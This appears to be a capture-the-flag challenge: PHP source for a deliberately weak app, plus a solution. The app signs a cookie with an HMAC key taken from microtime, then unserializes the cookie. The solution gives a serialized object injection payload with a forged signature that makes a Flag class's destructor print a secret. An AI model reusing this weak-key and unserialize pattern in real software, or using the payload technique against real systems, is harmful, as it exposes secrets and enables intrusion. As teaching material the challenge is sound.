```php
<?php
error_reporting(0);

require 'token.php';
$cookieName = 'very_secure_role';

if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['showme'])) {
    show_source('index.php');
    exit;
}

class Flag
{
    private $action;
    function __destruct()
    {
        if ($this->action == 'get') {
            echo getenv('LEVEL_15');
            die();
        }
    }
}

function generateAndSaveToken($filename = "token.php")
{
    // Generate token
    $token = substr((double) microtime() * 1000000, 0, 6);

    // Save token to PHP file
    $phpCode = "<?php\n\$generatedToken = '$token';";
    file_put_contents($filename, $phpCode);

    return $token;
}

function generateHmac($stringToSign, $secretKey = null)
{
    global $generatedToken;
    $secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;

    $hashAlgorithm = 'sha256';
    $hmac = hash_hmac($hashAlgorithm, $stringToSign, $secretKey, true);

    $hexHmac = bin2hex($hmac);

    return $hexHmac;
}

function validateHmac($stringToValidate, $providedHmac, $secretKey = null)
{
    global $generatedToken;
    $secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;

    $hashAlgorithm = 'sha256';
    $generatedHmac = hash_hmac($hashAlgorithm, $stringToValidate, $secretKey, true);
    $generatedHexHmac = bin2hex($generatedHmac);

    // Use a secure comparison function to avoid timing attacks
    $isValid = hash_equals($providedHmac, $generatedHexHmac);

    return $isValid;
}

if (!isset($_COOKIE[$cookieName])) {
    setcookie($cookieName, serialize('TARS') . '.' . generateHmac(serialize('TARS')), time() + 86400, '/');
} else {
    $cookieValue = explode('.', $_COOKIE[$cookieName])[0];
    $signiture = explode('.', $_COOKIE[$cookieName])[1];

    if (validateHmac($cookieValue, $signiture)) {
        unserialize($cookieValue);
    }
}

// generateAndSaveToken()
?>
```

<details>
  <summary><b>Exploite</b></summary>

  ```text
the cookie value should have the following value:
very_secure_role=O:4:"Flag":1:{s:6:"action";s:3:"get";}.efa9fbdb0bcb5bdce882e8b156321259663538f57490268f81f43538c99e6640
  ```
</details>


